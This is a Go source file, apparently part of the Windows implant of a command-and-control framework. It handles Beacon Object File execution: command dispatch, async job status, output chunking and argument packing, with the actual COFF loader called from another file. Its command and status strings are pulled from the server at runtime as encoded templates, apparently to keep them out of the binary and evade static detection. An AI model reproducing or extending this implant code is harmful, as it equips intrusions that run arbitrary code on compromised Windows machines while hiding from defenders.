// server/docker/payloads/Windows/action_bof.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"runtime"
	"strings"
	"sync"
	"time"
)

// BOFTemplate receives string templates from server
type BOFTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// BOF template indices (must match server's common.go)
const (
	// Command names (350-359)
	idxBofCmdName        = 350 // bof
	idxBofCmdAsync       = 351 // bof-async
	idxBofCmdJobs        = 352 // bof-jobs
	idxBofCmdOutput      = 353 // bof-output
	idxBofCmdKill        = 354 // bof-kill
	idxBofCmdAsyncPrefix = 355 // bof-async (with space)
	idxBofCmdAsyncStatus = 356 // bof-async-status
	idxBofCmdAsyncOutput = 357 // bof-async-output
	idxBofOSWindows      = 358 // windows

	// Job status values (360-364)
	idxBofStatusRunning   = 360 // running
	idxBofStatusCompleted = 361 // completed
	idxBofStatusCrashed   = 362 // crashed
	idxBofStatusKilled    = 363 // killed
	idxBofStatusTimeout   = 364 // timeout

	// Output markers (365-369)
	idxBofAsyncStarted   = 365 // BOF_ASYNC_STARTED
	idxBofAsyncPrefix    = 366 // BOF_ASYNC_
	idxBofChunkPrefix    = 367 // |CHUNK_
	idxBofChunkSeparator = 368 // \n---CHUNK_SEPARATOR---\n
	idxBofPipeSep        = 369 // |

	// Final status markers (370-374)
	idxBofFinalCompleted = 370 // COMPLETED
	idxBofFinalCrashed   = 371 // CRASHED
	idxBofFinalKilled    = 372 // KILLED
	idxBofFinalTimeout   = 373 // TIMEOUT
	idxBofFinalOutput    = 374 // OUTPUT

	// Misc strings (375-377)
	idxBofTruncYes     = 375 // YES
	idxBofTruncDots    = 376 // ...
	idxBofTruncatedMsg = 377 // (OUTPUT TRUNCATED - exceeded 10MB limit)

	// Output message fragments (378-387)
	idxBofJobPrefix       = 378 // Job
	idxBofStillRunning    = 379 // is still running\n
	idxBofChunksSent      = 380 // Chunks sent:
	idxBofSpaceParen      = 381 // (
	idxBofNoBufferedOut   = 382 // ) has no buffered output\n
	idxBofOutputForJob    = 383 // Output for job
	idxBofChunksSentParen = 384 // (chunks sent:
	idxBofCloseColonNL    = 385 // ):\n
	idxBofCloseParen      = 386 // )

	// IPC path (388)
	idxBofIPCPath = 388 // \IPC$
)

// Shared template storage for all BOF-related files
var (
	bofTemplate   []string
	bofTemplateMu sync.RWMutex
)

// SetBOFTemplate sets the shared BOF template (called from command processing)
func SetBOFTemplate(templates []string) {
	bofTemplateMu.Lock()
	bofTemplate = templates
	bofTemplateMu.Unlock()
}

// bofTpl safely retrieves a template string by index
func bofTpl(idx int) string {
	bofTemplateMu.RLock()
	defer bofTemplateMu.RUnlock()
	if bofTemplate != nil && idx < len(bofTemplate) {
		return bofTemplate[idx]
	}
	return ""
}

// Convenience functions for common template strings
func bofCmdName() string        { return bofTpl(idxBofCmdName) }
func bofOSWindows() string      { return bofTpl(idxBofOSWindows) }
func bofCmdPrefix() string      { return bofTpl(idxBofCmdName) + " " } // "bof "
func bofAsyncCmdPrefix() string { return bofTpl(idxBofCmdAsyncPrefix) }
func bofStatusRunning() string  { return bofTpl(idxBofStatusRunning) }
func bofStatusCompleted() string { return bofTpl(idxBofStatusCompleted) }
func bofStatusCrashed() string  { return bofTpl(idxBofStatusCrashed) }
func bofStatusKilled() string   { return bofTpl(idxBofStatusKilled) }
func bofStatusTimeout() string  { return bofTpl(idxBofStatusTimeout) }
func bofAsyncStarted() string   { return bofTpl(idxBofAsyncStarted) }
func bofAsyncPrefixStr() string { return bofTpl(idxBofAsyncPrefix) }
func bofChunkPrefixStr() string { return bofTpl(idxBofChunkPrefix) }
func bofChunkSeparator() string { return bofTpl(idxBofChunkSeparator) }
func bofPipeSep() string        { return bofTpl(idxBofPipeSep) }
func bofFinalCompleted() string { return bofTpl(idxBofFinalCompleted) }
func bofFinalCrashed() string   { return bofTpl(idxBofFinalCrashed) }
func bofFinalKilled() string    { return bofTpl(idxBofFinalKilled) }
func bofFinalTimeout() string   { return bofTpl(idxBofFinalTimeout) }
func bofFinalOutput() string    { return bofTpl(idxBofFinalOutput) }
func bofTruncYes() string       { return bofTpl(idxBofTruncYes) }
func bofTruncDots() string      { return bofTpl(idxBofTruncDots) }
func bofTruncatedMsg() string   { return bofTpl(idxBofTruncatedMsg) }
func bofJobPrefix() string      { return bofTpl(idxBofJobPrefix) }
func bofStillRunning() string   { return bofTpl(idxBofStillRunning) }
func bofChunksSent() string     { return bofTpl(idxBofChunksSent) }
func bofSpaceParen() string     { return bofTpl(idxBofSpaceParen) }
func bofNoBufferedOut() string  { return bofTpl(idxBofNoBufferedOut) }
func bofOutputForJob() string   { return bofTpl(idxBofOutputForJob) }
func bofChunksSentParen() string { return bofTpl(idxBofChunksSentParen) }
func bofCloseColonNL() string   { return bofTpl(idxBofCloseColonNL) }
func bofCloseParen() string     { return bofTpl(idxBofCloseParen) }
func bofIPCShare() string       { return bofTpl(idxBofIPCPath) }
func bofCmdAsyncStatus() string { return bofTpl(idxBofCmdAsyncStatus) }
func bofCmdAsyncOutput() string { return bofTpl(idxBofCmdAsyncOutput) }

// BOFCommand handles BOF execution
type BOFCommand struct {
	tpl *BOFTemplate
}

// getTpl safely retrieves a template string by index
func (c *BOFCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

func (c *BOFCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data if available
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
		if err == nil {
			c.tpl = &BOFTemplate{}
			if err := json.Unmarshal(decoded, c.tpl); err == nil {
				// Set shared template for other BOF files to use
				SetBOFTemplate(c.tpl.Templates)
			}
		}
	}

	// For Windows only - BOF is Windows-specific
	osWindows := c.getTpl(idxBofOSWindows)
	if osWindows == "" {
		osWindows = bofOSWindows()
	}
	if runtime.GOOS != osWindows {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	// This will be handled by the command queue's processBOF method
	// The actual execution happens there with the full Command data
	return CommandResult{
		Output:      Succ(S4),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// splitIntoChunks splits a string into chunks of specified maximum size
// This is used by both regular BOF and BOF async for chunking large outputs
func splitIntoChunks(s string, maxSize int) []string {
	if len(s) <= maxSize {
		return []string{s}
	}

	var chunks []string
	for len(s) > 0 {
		chunkSize := maxSize
		if chunkSize > len(s) {
			chunkSize = len(s)
		}

		// Try to split at a newline if possible
		chunk := s[:chunkSize]
		if chunkSize < len(s) {
			if idx := strings.LastIndex(chunk, "\n"); idx > 0 && idx > chunkSize/2 {
				chunkSize = idx + 1
				chunk = s[:chunkSize]
			}
		}

		chunks = append(chunks, chunk)
		s = s[chunkSize:]
	}

	return chunks
}

// parseBOFArguments parses BOF arguments in the Beacon format
// Format: bXXXX for binary, iXXX for int, sXX for short, zXXX for string, ZXXX for wide string
func parseBOFArguments(argString string) ([]byte, error) {
	args := strings.Fields(argString)
	if len(args) == 0 {
		return nil, nil
	}

	// On Windows, this will use the lighthouse package's PackArgs function
	// On non-Windows, it returns empty args
	return parseBOFArgumentsPlatform(args)
}

// executeBOF is the platform-specific BOF execution function
// This will be implemented differently for Windows
func executeBOF(bofBytes []byte, args []byte) (string, error) {
	osWindows := bofOSWindows()
	if osWindows == "" {
		osWindows = "windows" // Fallback
	}
	if runtime.GOOS != osWindows {
		return "", nil
	}

	// The actual Windows implementation would go here
	// This would use the coff loader from the provided code
	// On Windows, this calls executeBOFPlatform from action_bof_windows.go
	return executeBOFPlatform(bofBytes, args)
}
